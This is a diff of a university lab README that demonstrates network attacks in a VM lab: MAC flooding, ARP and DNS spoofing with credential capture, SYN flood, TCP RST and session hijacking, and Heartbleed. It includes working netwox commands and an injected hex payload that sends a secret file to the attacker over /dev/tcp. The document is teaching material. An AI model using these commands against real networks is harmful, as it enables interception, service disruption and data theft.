@@ -1,18 +1,22 @@
 # UTH 441 : Internet Protocols Design 2019-2020
+
 # FINAL PROJECT: Common Network Protocol attacks
 
-## Leuteris Chatziefremidis 2209
-## Sotiris Evangelou 2159
-## Spyros Panagiotopoulos 1777
+### Leuteris Chatziefremidis 2209
+
+### Sotiris Evangelou 2159
+
+### Spyros Panagiotopoulos 1777
 
 ## Contents:
+
 1. Mac Table Overflow
 2. ARP Protocol Spoofing
 3. DNS Protocol Spoofing
 4. TCP SYN Flooding
 5. TCP RST Attack
 6. TCP Session Highjacking
-7. Heartbleed 
+7. Heartbleed
 
 # 1: Mac Table Overflow
 
@@ -30,13 +34,13 @@ When switch receives a frame, it looks in the MAC address table (sometimes calle
 If the switch has already learned the MAC address of the computer connected to his particular port then an entry exists for the MAC address. In this case the switch forwards the frame to the MAC address port designated in the MAC address table. If the MAC address does not exist, the switch acts like a hub and forwards the frame out every other port on the switch while learning the MAC for next time.
 
 <div>
-  <img style="display:block;margin:0 auto;" src="img/before.jpg" width="400px"/>
+  <img style="display:block;margin:0 auto;" src="mac_overflow/img/before.jpg" width="400px"/>
 </div>
 
 Computer A sends traffic to computer B. The switch receives the frames and looks up the destination MAC address in its MAC address table. If the switch does not have the destination MAC in the MAC address table, the switch then copies the frame and sends it out every switch port like a broadcast. This means that not only PC B receives the frame, PC C also receives the frame from host A to host B, but because the destination MAC address of that frame is host B, host C drops that frame.
 
 <div>
-  <img style="display:block;margin:0 auto;" src="img/before1.jpg" width="400px"/>
+  <img style="display:block;margin:0 auto;" src="mac_overflow/img/before1.jpg" width="400px"/>
 </div>
 
 ## Normal switch function
@@ -44,7 +48,7 @@ Computer A sends traffic to computer B. The switch receives the frames and looks
 PC B receives the frame and sends a reply to PC A. The switch then learns that the MAC address for PC B is located on port 2 and writes that information into the MAC address table. From now on any frame sent by host A (or any other host) to host B is forwarded to port 2 of the switch and not broadcast out every port. The switch is working like it should. This is the main goal of switch functionality, to have separate collision domain for each port on the switch.
 
 <div>
-  <img style="display:block;margin:0 auto;" src="img/normal.jpg" width="400px"/>
+  <img style="display:block;margin:0 auto;" src="mac_overflow/img/normal.jpg" width="400px"/>
 </div>
 
 ## Attack
@@ -54,7 +58,7 @@ But this is where the attacker is coming into play. The key to understanding how
 The switch then enters into a fail-open mode that means that it starts acting as a hub. In this situation switch will broadcasts all received packets to all the machines on the network. As a result, the attacker (in our case “PC C”) can see all the frames sent from a victim host to another host without a MAC address table entry.
 
 <div>
-  <img style="display:block;margin:0 auto;" src="img/attack.jpg" width="400px"/>
+  <img style="display:block;margin:0 auto;" src="mac_overflow/img/attack.jpg" width="400px"/>
 </div>
 
 In this case, an attacker will use legitimate tools for malicious actions. The figure shows how an attacker can use the normal operating characteristics of the switch to stop the switch from operating.
@@ -110,7 +114,7 @@ Firstly we launch a terminal in order to start the POX network controller, which
 
 - ./run_pox.sh
 
-![Screenshot](./img/run_pox.png)
+![Screenshot](./mac_overflow/img/run_pox.png)
 
 In another terminal (if you are using a remote machine, make sure the X-forwarding is enabled.):
 
@@ -118,9 +122,9 @@ In another terminal (if you are using a remote machine, make sure the X-forwardi
 
 This will start the Mininet network emulator and there will be terminals pops up for each of the nodes in the network. Close the terminals for switches and controllers, but keep the terminals for Alice, Bob and Eve.
 
-![Screenshot](./img/run.png)
+![Screenshot](./mac_overflow/img/run.png)
 
-![Screenshot](./img/spawn_term.png)
+![Screenshot](./mac_overflow/img/spawn_term.png)
 
 ## In Alice's Terminal
 
@@ -130,7 +134,7 @@ Alice will now create some traffic by pinging Bob:
 
 You should be able to see some output like the following:
 
-![Screenshot](./img/ping.png)
+![Screenshot](./mac_overflow/img/ping.png)
 
 ## In Eve's Terminal
 
@@ -138,7 +142,7 @@ We will now run tcpdump to eavesdrop the traffic betweeh Alice (10.0.0.1) and Bo
 
 - sudo tcpdump -n host 10.0.0.1
 
-![Screenshot](./img/tcpdump.png)
+![Screenshot](./mac_overflow/img/tcpdump.png)
 
 Since the switch between Alice/Bob/Eve already learned about the address of Alice and Bob, it will not boradcast the packet and therefore Eve will not be able to see the packets between Alice and Bob.
 
@@ -146,25 +150,25 @@ Now, we will let Eve generate some ethernet packets with randomly generated sour
 
 - python attack.py
 
-![Screenshot](./img/attack.png)
+![Screenshot](./mac_overflow/img/attack.png)
 
 You should be able to see Eve starts sending a lot of packets into the network.
 
 Back to Eve's first terminal (switch back by "ctrl+a 0). After the attack traffic overflowed swtiches' address table, switches will start to broadcast Alice and Bob's traffic and they should start showing up in Eve's tcpdump trace:
 
-![Screenshot](./img/tcp_out.png)
-
+![Screenshot](./mac_overflow/img/tcp_out.png)
 
 # 2: ARP Protocol Spoofing
 
 ## Protocol Description
+
 The various applications use IP addresses to communicate with computers in other networks, but when in the same network, the communication is achieved using MAC Addressing in the Layer 2 of the OSI model.
 
 A new computer connecting to the network doesn't know the MAC addresses if the machines it wants to reach and this is where <b>Address Resolution Protocol (ARP) </b> comes into play. ARP is used to find MAC addresses of computers using their IP address, and in the arp tables these pairings are kept by each computer.
 
 ## Attack Description
 
-ARP <b>poisoning/spoofing</b> is when an attacker sends falsified ARP messages over a local area network (LAN) to link an attacker’s MAC address with the IP address of a legitimate computer or server on the network. 
+ARP <b>poisoning/spoofing</b> is when an attacker sends falsified ARP messages over a local area network (LAN) to link an attacker’s MAC address with the IP address of a legitimate computer or server on the network.
 Once the attacker’s MAC address is linked to an authentic IP address, the attacker can receive any messages directed to the legitimate MAC address. As a result, the attacker can intercept, modify or block communicates to the legitimate MAC address.
 
 <img src="https://static.wixstatic.com/media/3163d1_a045cad7876b4dc49fa54004d49d5ced~mv2.jpg">
@@ -179,7 +183,6 @@ The MITM attack, through which we will perform ARP Spoofing will be performed fr
 
 After opening Ettercap in promiscuous mode and selecting Unified sniffing, we need to select our targets, that are 1) The victim VM and 2) The Gateway router. We are on the ethernet interface of our host so:
 
-
 <img width=90% src=https://user-images.githubusercontent.com/28576118/71472689-a56e9e80-27dc-11ea-9677-2de6851ab61f.png>
 
 Using the default net tool ip we define our own IP and the gateway IP.
@@ -188,6 +191,7 @@ Let's use Ettercap's Host List utility to define the victim's IP:
 <img width=80% src=https://user-images.githubusercontent.com/28576118/71472904-89b7c800-27dd-11ea-9d88-01cd834c5934.png>
 
 We now have the 3 IPs needed:
+
 <ul>
   <li> Attacker's IP: 192.168.1.116 </li>
   <li> Victim's IP: 192.168.1.111 </li>
@@ -207,26 +211,27 @@ Now all the packets between the victim and the gateway are passing through our a
 
 ![analysis](https://user-images.githubusercontent.com/28576118/71473909-bc63bf80-27e1-11ea-9ea3-59a150e702ec.png)
 
-Doing a simple <i> ip a </i> on our attacker host will show us that the source MAC address of the ICMP packet has the attacker's MAC as source. 
+Doing a simple <i> ip a </i> on our attacker host will show us that the source MAC address of the ICMP packet has the attacker's MAC as source.
 
 ![ipa](https://user-images.githubusercontent.com/28576118/71474168-ed90bf80-27e2-11ea-8b71-6025032fddff.png)
 
 This means that any of these packets are passing through our host that is the man in the middle, and we can see the packets passing through and do a lot of <i> nasty </i> stuff with the targets' connection.
 
-
 # 3: DNS Protocol Spoofing
 
 ## Protocol Description
+
 Whenever we surf the internet, we mostly visit websites using their hostnames (e.g. google.com, github.com etc.), not the IP addresses where these websites are hosted. In order to do that, some IP-Hostname pairs must exist, and this is offered by the DNS <b>(Domain Name Server)</b> protocol.
 DNS is a distributed database implemented in a hierarchy of name servers. It is an application layer protocol for message exchange between clients and servers.
 
 <img width="60%" src="https://flylib.com/books/2/203/1/html/2/images/cn061201.jpg">
 
-Whenever we want to know the IP for a specific domain name we need to do a DNS Request to a local nameserver. 
+Whenever we want to know the IP for a specific domain name we need to do a DNS Request to a local nameserver.
 If it has the answer stored in its database, it replies with a DNS Reply. If not, it requests one the root nameservers, that in turn routes the query to an intermediate or authoritative nameserver that can answer our request. At the end, we get back the IP corresponding to that domain name.
 
 ## DNS Spoofing description
-During the ARP Spoofing markdown, we saw how if we are in the same local network, we can bring our computer to appear (maliciously) as the destination computer to a communication, and thus become a "proxy" between a connection, that can intercept or even tweak the packets coming through. 
+
+During the ARP Spoofing markdown, we saw how if we are in the same local network, we can bring our computer to appear (maliciously) as the destination computer to a communication, and thus become a "proxy" between a connection, that can intercept or even tweak the packets coming through.
 
 In such a way, we can intercept the DNS Requests coming through, and answer with our own crafted DNS replies that will match the wanted domain name (e.g. facebook.com) to an IP that we can control. If this succeeds, the victim entering facebook will land on our maliciously crafted replica, and enter their real credentials in our unsafe and controlled environment.
 
@@ -242,11 +247,12 @@ In order to intercept all DNS requests from the victim we need to perform a MITM
 After doing the steps mentioned above, we are now the Man in the Middle of the connection between the victim machine and the gateway. This means we are intercepting all the packets between them, such as the <b>DNS Request</b> packets.
 
 - We can check that by doing a simple ping from the victim to a domain name such as google.com:
-![pinggoogle](https://user-images.githubusercontent.com/28576118/71663236-078b4e80-2d5d-11ea-81ac-aa07856b54de.png)
+  ![pinggoogle](https://user-images.githubusercontent.com/28576118/71663236-078b4e80-2d5d-11ea-81ac-aa07856b54de.png)
 - On the attacker's machine we can intercept all the important DNS packets using appropriate filters:
-![wiredns](https://user-images.githubusercontent.com/28576118/71663367-99935700-2d5d-11ea-8acd-0f92275a64a8.png)
+  ![wiredns](https://user-images.githubusercontent.com/28576118/71663367-99935700-2d5d-11ea-8acd-0f92275a64a8.png)
 
 ## DNS Spoofing
+
 As the attacker, since we are intercepting those DNS requests, we would also like to poison them in order to redirect to pages that we want (and control most often), instead of the domains the victim user asks for.
 
 We can do this as well using ettercap, by choosing dns_spoof in the Plugins tab while arp poisoning the 2 targets:
@@ -279,7 +285,6 @@ Thus, when the victim tries to enter credentials and log in, we will be able to 
 
 ![postreq](https://user-images.githubusercontent.com/28576118/71694221-30403200-2db7-11ea-9a16-402868f49985.png)
 
-
 # 4: TCP SYN Flooding
 
 ## Description
@@ -297,11 +302,12 @@ Here, we will show some of the methods that can be used to attack a TCP connecti
 ## Attacks
 
 ### SYN flooding
+
 With SYN flood, the attacker tries to consume enough resources of the attacked machine in order to make it unresponsive to legitimate users.
 
 When a new TCP connection is attempted the client and the server exchange 3 messages
 
-1. Client: `SYN` 
+1. Client: `SYN`
 2. Server: `SYN+ACK`
 3. Client: `ACK`
 
@@ -309,7 +315,7 @@ When a new TCP connection is attempted the client and the server exchange 3 mess
 
 > Image taken from Wikipedia, https://en.wikipedia.org/wiki/SYN_flood
 
-The first `SYN` informs the server that a client wants to establish a new connection. The server stores this request in a queue and the connection is called a *half-open connection*. When the third step (the client sending the `ACK` ) is completed the request is removed from this queue.
+The first `SYN` informs the server that a client wants to establish a new connection. The server stores this request in a queue and the connection is called a _half-open connection_. When the third step (the client sending the `ACK` ) is completed the request is removed from this queue.
 
 In this attack, the queue of the half-open connections is used to make the server unresponsive to new clients. The attacker sends a lot of `SYN` without replying `ACK`, filling the queue and binding resources of the server. When a legitimate client tries to connect to the server, the server will not be able to accept new `SYN` packets.
 
@@ -324,8 +330,8 @@ The role of the attacker is given to the host machine.
 
 <img src="https://camo.githubusercontent.com/18a9109945b800ef925b0200b6f5a1f941ee8be4/68747470733a2f2f7370616e6167696f742e67722f6e6574776f726b732f766d732e706e67" width="50%">
 
-
 To demonstrate this attack, we need to turn off the protection enabled by default (in Debian based OSes) using the command
+
 ```bash
 sysctl -w net.ipv4.tcp_syncookies=0
 ```
@@ -404,7 +410,6 @@ ssh: connect to host 10.2.1.16 port 22: Operation timed out
 
 We need to specify here that this attack will only affect the port 22 and the SSH service. If telnet was running on port 23 it would not be affected because the each port has its own connection queue. Also, the server will continue operating normally, without any indication that an attack is happening.
 
-
 # 5: TCP RST Attack
 
 There are two ways to terminate and established TCP connection between two hosts (let's call them A and B). The first way is done with A informing B that it wants to terminate the connection by sending a `FIN` packet and expects and `ACK` from B. If B wants also to terminate his side of the connection (because TCP connections are two one-way "pipes") can also send a `FIN` packet and after `ACK` is received the connection is considered closed.
@@ -414,9 +419,11 @@ The second way is for host A to send a `RST` packet. The `RST` packet will indic
 Using the `RST` packet, an attacker can terminate an established connection without the consent of any of the legitimate users.
 
 #### Preparation
+
 We will use again 3 machines, one VM and the host as the legitimate users and the other VM as the attacker (see preparation in the previous attack).
 
 #### Attack
+
 Considering we know everything about the current connection between the server and the client (both source and destination IP and port number), we need to guess the sequence number because if it's not considered valid by the receiver our(the attacker's) packet will be discarded.
 We will use wireshark to monitor the traffic between the two users and find the sequence number.
 
@@ -434,8 +441,9 @@ Parameters:
  -q|--tcp-seqnum uint32         TCP seqnum (rand if unset) {0}
  -B|--tcp-rst|+B|--no-tcp-rst   TCP rst
  --help2                        display help for advanced parameters
- ```
- (We removed all the unused options from the parameters list because the list was huge)
+```
+
+(We removed all the unused options from the parameters list because the list was huge)
 
 By monitoring the connection in Wireshark, we can see the current sequence numbers, and we can use them to predict the next one. TCP has a certain "window" so we don't need to be extremely accurate.
 Here are the connections to the server
@@ -456,14 +464,17 @@ and here is the latest sequence number as captured by Wireshark (Wireshark shows
 By inspecting the other packets we can see that the sequence number increases by 36 almost every time, so 1806966531+36=1806966567 will be our guess.
 
 We launch the attack by running
+
 ```bash
 netwox 40 -l 10.2.1.5 -m 10.2.1.16 -o 52494 -p 22 -B -q 1806966567
 ```
 
 If we guess correctly, we will see on the client connected to the server this message
+
 ```bash
 user@server:~$ packet_write_wait: Connection to 10.2.1.16 port 22: Broken pipe
 ```
+
 which indicates that our attack was successful!
 
 # 6: TCP Session Highjacking
@@ -475,14 +486,16 @@ Because the TCP protocol offers no security measures, it's easy for an attacker 
 The only obstacle the attacker needs to overcome, is to correctly guess the sequence number of the packets so the crafted malicious ones won't be discarded as invalid.
 
 #### Preparation
+
 We will perform a TCP session hijack on an client that uses telnet to connect to a server. We selected telnet because the connection between the hosts is unencrypted, so it will be easier to demonstrate.
 
 We will use again 3 machines, one VM and the host (10.2.1.5,10.2.12) as the legitimate users and the other VM as the attacker (10.2.1.13) (see preparation in the first attack).
 
 #### Attack
-The host (10.2.1.5) connects to the server using telnet. The goal of the attacker is to read the contents of a *top secret* file in the server by hijacking the already established connection.
 
-In order to obtain the sequence number of the connection, we will use again Wireshark to monitor the traffic. 
+The host (10.2.1.5) connects to the server using telnet. The goal of the attacker is to read the contents of a _top secret_ file in the server by hijacking the already established connection.
+
+In order to obtain the sequence number of the connection, we will use again Wireshark to monitor the traffic.
 
 ![image](https://user-images.githubusercontent.com/7012176/73144039-ae87af80-40a9-11ea-8acf-2ce95ec55f54.png)
 
@@ -495,6 +508,7 @@ So, by intercepting the traffic, we managed to learn the five characteristics of
 Although the attacker can inject his own packets in the connection, cannot listen for the responses because they will arrive on the original client. To see the results of the executed command, we need to send the output to the machine of the attacker.
 
 The program `netcat` allows us to create a simple TCP server on a specified port that we will use to listen for responses. We launch a server by running this command
+
 ```bash
 nc -l -p 1940
 ```
@@ -516,6 +530,7 @@ Hello from host
 Also, we can use a special file in the `/dev` folder called tcp. If we redirect the output of a command to `/dev/tcp/10.2.1.13/1940`, the operating system will open a connection to IP 10.2.1.13 at the port 1940 and send the output of the command through this connection.
 
 After we decided which command we want to execute, we need to convert it before sending it to a hex string. We can use Python to do this or any online converter. So, the command
+
 ```bash
 
 cat top-secret.txt > /dev/tcp/10.2.1.13/1940
@@ -530,11 +545,11 @@ We will use again the `netwox` program and the tool number 40 which can be used 
 netwox 40 -l 10.2.1.5 -m 10.2.1.12 -o 61775 -p 23 -H "0a636174202f686f6d652f757365722f746f702d7365637265742e747874203e202f6465762f7463702f31302e322e312e31332f313934300a0d" -q 3321793573 -r 688874018 -z -A -E 2047
 ```
 
-With the `-z` `-r` flags we set the acknowledgement number from the last packet sent by the server, and we can obtain this, again, from Wireshark. The `-E` flag sets the window size. We added new lines at the beginning and at the end of the command with the hex number *0a* so we can make sure this attack works even if the client is in the middle of typing a command, and the *0d* at the end because telnet commands end at the *\r* character.
+With the `-z` `-r` flags we set the acknowledgement number from the last packet sent by the server, and we can obtain this, again, from Wireshark. The `-E` flag sets the window size. We added new lines at the beginning and at the end of the command with the hex number _0a_ so we can make sure this attack works even if the client is in the middle of typing a command, and the _0d_ at the end because telnet commands end at the _\r_ character.
 
 If we got the sequence and ack numbers correctly, after executing this command we will see that the `netcat` instance received the intended output
 
-```bash 
+```bash
 user@client:~$ nc -l -p 1940 -v
 listening on [any] 1940 ...
 10.2.1.12: inverse host lookup failed: Unknown host
@@ -551,10 +566,10 @@ But not only that. Because we injected a forged packet and the client has no ide
 
 # 7: Heartbleed
 
-The Heartbleed bug is a severe implementation flaw in the OpenSSL library, which enables attackers to steal data from the 
-memory of the victim server. The contents of the stolen data depend on what is there in the memory of the server. 
+The Heartbleed bug is a severe implementation flaw in the OpenSSL library, which enables attackers to steal data from the
+memory of the victim server. The contents of the stolen data depend on what is there in the memory of the server.
 
-It could potentially contain private keys, TLS session keys, user names, passwords, credit cards, etc. 
+It could potentially contain private keys, TLS session keys, user names, passwords, credit cards, etc.
 The vulnerability is in the implementation of the Heartbeat protocol,which is used by SSL/TLS to keep the connection alive.
 
 ## How Heartbleed works
@@ -571,9 +586,9 @@ That's how it's supposed to work. The Heartbleed vulnerability arose because Ope
 
 ## Enviroment Setup
 
-In this lab, we need to set up two VMs: one called attacker machine and the other called victim server.We use the pre-built 
+In this lab, we need to set up two VMs: one called attacker machine and the other called victim server.We use the pre-built
 <a href="https://seedsecuritylabs.org/lab_env.html">SEEDUbuntu12.04</a> VM. The VMs need to use the NAT-Network adapter for
-the network setting. This can be done by going to the VM settings, picking Network, and clicking the Adaptor tag to switch 
+the network setting. This can be done by going to the VM settings, picking Network, and clicking the Adaptor tag to switch
 the adapter to NAT-Network. Make sure both VMs are on the same NAT-Network.
 
 The website used in this attack can be any HTTPS website that uses SSL/TLS. However, since it is
@@ -582,44 +597,44 @@ illegal to attack a real website, we have set up a website in our VM, and conduc
 ## Launch the attack
 
 The actual damage of the Heartbleed attack depends on what kind of information
-is stored in the server memory. If there has not been much activity on the server, you will not be able to steal 
-useful data. Therefore, we need to interact with the web server as legitimate users. Let us do it as the administrator, 
+is stored in the server memory. If there has not been much activity on the server, you will not be able to steal
+useful data. Therefore, we need to interact with the web server as legitimate users. Let us do it as the administrator,
 and do the followings:item Visit https://www.heartbleedlabelgg.com from your browser.
 
-* Visit https://www.heartbleedlabelgg.com from your browser.
+- Visit https://www.heartbleedlabelgg.com from your browser.
 
-![Screenshot](./img/page.png)
+![Screenshot](./heartbleed/img/page.png)
 
-* Login as the site administrator. (User Name:admin; Password:seedelgg)
+- Login as the site administrator. (User Name:admin; Password:seedelgg)
 
-![Screenshot](./img/adminlog.png)
+![Screenshot](./heartbleed/img/adminlog.png)
 
-* Add Boby as friend.
+- Add Boby as friend.
 
-![Screenshot](./img/addfriend.png)
+![Screenshot](./heartbleed/img/addfriend.png)
 
-* Send Boby a private message.
+- Send Boby a private message.
 
-![Screenshot](./img/message.png)
+![Screenshot](./heartbleed/img/message.png)
 
-After you have done enough interaction as legitimate users, you can launch the attack and see what information you can 
+After you have done enough interaction as legitimate users, you can launch the attack and see what information you can
 get out of the victim server.The code that we use is called <a href="http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Networking/Heartbleed/attack.py">attack.py</a> which was originally written by Jared Stafford.
 
-![Screenshot](./img/start.png)
+![Screenshot](./heartbleed/img/start.png)
 
-You may need to run the attack code multiple times to get useful data. Try and see whether you can get the following 
+You may need to run the attack code multiple times to get useful data. Try and see whether you can get the following
 information from the target server:
 
-* User name and password.
+- User name and password.
 
-![Screenshot](./img/usernamepass.png)
+![Screenshot](./heartbleed/img/usernamepass.png)
 
-* Admin Activity
+- Admin Activity
 
-![Screenshot](./img/boby%20message.png)
+![Screenshot](./heartbleed/img/boby%20message.png)
 
-To fix the Heartbleed vulnerability, the best way is to update the OpenSSL library to the newest version.This can be 
+To fix the Heartbleed vulnerability, the best way is to update the OpenSSL library to the newest version.This can be
 achieved using the following commands:
 
-* sudo apt-get update
-* sudo apt-get upgrade
+- sudo apt-get update
+- sudo apt-get upgrade
